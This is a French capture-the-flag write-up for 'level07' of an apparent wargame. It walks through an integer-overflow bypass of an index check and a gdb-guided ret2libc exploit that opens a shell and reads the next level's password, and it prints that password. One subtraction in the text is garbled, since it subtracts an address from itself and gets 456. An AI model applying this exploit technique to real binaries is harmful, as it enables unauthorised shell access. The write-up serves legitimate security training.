# Level 07

Voici le code source de ce niveau:

```C
#include <stdbool.h>
#include <stdio.h>
#include <string.h>
#include <strings.h>
#include <sys/types.h>

void clear_stdin(void)
{
    int ascii_c;

    while ((ascii_c = getchar()) != -1)
        if ((char)ascii_c == '\n')
            return ;
}

uint get_unum(void)
{
    uint nb;

    nb = 0;
    fflush(stdout);
    scanf("%u", &nb);
    clear_stdin();
    return nb;
}

bool read_number(uint *db)
{
    uint index;

    printf(" Index: ");
    index = get_unum();
    printf(" Number at data[%u] is %u\n", index, db[index]);
    return true;
}

bool store_number(uint *db)
{
    uint nb;
    uint index;

    printf(" Number: ");
    nb = get_unum();
    printf(" Index: ");
    index = get_unum();
    if ((index % 3) == 0 || (nb >> 24 == 183))
    {
        puts(" *** ERROR! ***");
        puts("   This index is reserved for wil!");
        puts(" *** ERROR! ***");
        return false;
    }
    db[index] = nb;
    return true;
}

int main(int ac, char **av, char **envp)
{
    uint db[100];
    char cmd[20];

    bzero(db, 100);
    for (size_t i = 0; av[i] != NULL; i++)
        bzero(av[i], strlen(av[i]));
    for (size_t i = 0; envp[i] != NULL; i++)
        bzero(envp[i], strlen(envp[i]));
    puts(
        "----------------------------------------------------\n  Welcome to wil\'s crappy number storage service!   \n----------------------------------------------------\n Commands:                                          \n    store - store a number into the data storage    \n    read  - read a number from the data storage     \n    quit  - exit the program                        \n----------------------------------------------------\n   wil has reserved some storage :>                 \n----------------------------------------------------\n"
    );
    while (true)
    {
        bool success_cmd = false;

        bzero(cmd, 20);
        printf("Input command: ");
        fgets(cmd, 20, stdin);
        cmd[strcspn(cmd, "\n")] = '\0';
        if (strncmp(cmd, "store", 5) == 0)
            success_cmd = store_number(db);
        else if (strncmp(cmd, "read", 4) == 0)
            success_cmd = read_number(db);
        else if (strncmp(cmd, "quit", 4) == 0)
            return 0;
        if (success_cmd)
            printf(" Completed %s command successfully\n", cmd);
        else
            printf(" Failed to do %s command\n", cmd);
    }
    return 0;
}
```

Ce programme nous donne un prompt pour stocker et afficher des nombres dans un index. Le probleme est que aucune verification n'est faite concernant l'insertion de donnee en memoire. Nous pouvons donc ecrire et lire a n'importe quel endroit de la memoire, a ceci pres qu'on ne peut pas inserer un nombre a un index divisible par 3 (`if ((index % 3) == 0 || (nb >> 24 == 183))`). Ce probleme est facilement contourne grace a un `integer overflow`. Pour ceci nous devons calculer la valeur qui nous permetterai d'inserer a l'indice 0:

```s
➜  level07 git:(main) ✗ bc
bc 1.08.2
2^32
4294967296 # INT MAX
4294967296 / 4 # On divise par 4 car nous sommes en 32-bits
1073741824
```

Exemple:

```s
level07@OverRide:~$ ./level07
----------------------------------------------------
  Welcome to wil's crappy number storage service!
----------------------------------------------------
 Commands:
    store - store a number into the data storage
    read  - read a number from the data storage
    quit  - exit the program
----------------------------------------------------
   wil has reserved some storage :>
----------------------------------------------------

Input command: read
 Index: 0
 Number at data[0] is 0
 Completed read command successfully
Input command: store
 Number: 42
 Index: 1073741824
 Completed store command successfully
Input command: read
 Index: 0
 Number at data[0] is 42
 Completed read command successfully
```

L'idee est donc de faire un `ret2libc` pour executer `system("/bin/sh")` a l'aide de la `libc` compilee avec notre binaire. Pour ceci nous devons trouver l'adresse de `buff` et l'adresse de retour de `main()`. Ensuite la difference entre ces deux adresses nous donnera l'offset a partir du quel ecrire notre nouvelle adresse:

```s
(gdb) break *0x08048636 # Debut de store_number -> trouver adresse de buff
(gdb) break *0x080489f1 # instruction ret de main -> trouver adresse de retour
(gdb) run
Starting program: /home/users/level07/level07
# ...
Input command: store

Breakpoint 1, 0x08048636 in store_number ()
(gdb) x $ebp + 0x8
0xffffd530:     0xffffd554
(gdb) lay asm
(gdb) c
# ...
Input command: quit

Breakpoint 2, 0x080489f1 in main ()
(gdb) x $esp
0xffffd71c:     0xf7e45513
(gdb)
```

Donc nous devons faire `0xffffd71c - 0xffffd71c` ce qui nous donne `456` ensuite on divise ce nombre par 4 (systeme 32-bits) et nous obtenons `114`. Nous savons donc que nous devons ecrire notre adresse de retour a l'index `114` le probleme est que ce nombre est divisible par 3. Pour contourner ce probleme nous allons utiliser un `integer overflow` grace au nombre que nous avons trouve au debut: `1073741824 + 114 = 1073741938`

```bash
level07@OverRide:~$ ./level07
Input command: read
 Index: 114
 Number at data[114] is 4158936339
 Completed read command successfully
Input command: store
 Number: 42
 Index: 1073741938
 Completed store command successfully
Input command: read
 Index: 114
 Number at data[114] is 42
 Completed read command successfully
```

Maintenant nous devons trouver l'adresse de la string `/bin/sh` en memoire (presente, car codee en dur dans la `libc`), ainsi que l'adresse de `system()`

```s
(gdb) break main
Breakpoint 1 at 0x8048729
(gdb) run
Starting program: /home/users/level07/level07

Breakpoint 1, 0x08048729 in main ()
(gdb) info proc map
process 1789
Mapped address spaces:

        Start Addr   End Addr       Size     Offset objfile
        0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
        0xf7fcc000 0xf7fcd000     0x1000   0x1a0000 /lib32/libc-2.15.so
        0xf7fcd000 0xf7fcf000     0x2000   0x1a0000 /lib32/libc-2.15.so
        0xf7fcf000 0xf7fd0000     0x1000   0x1a2000 /lib32/libc-2.15.so
(gdb) find 0xf7e2c000,0xf7fd0000,"/bin/sh"
0xf7f897ec
1 pattern found.
(gdb) info functions system
All functions matching regular expression "system":

Non-debugging symbols:
0xf7e6aed0  system
```

Donc l'idee est de push l'adresse de `/bin/sh` dans la stack pour la passer comme argument de `system()`. Nous devons aussi convertir ces adresses en decimal ce qui nous donne ceci:

```bash
level07@OverRide:~$ ./level07
Input command: store
 Number: 4159090384
 Index: 1073741938
 Completed store command successfully
Input command: store
 Number: 4160264172
 Index: 116
 Completed store command successfully
Input command: quit
$ cat /home/users/level08/.pass
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
```
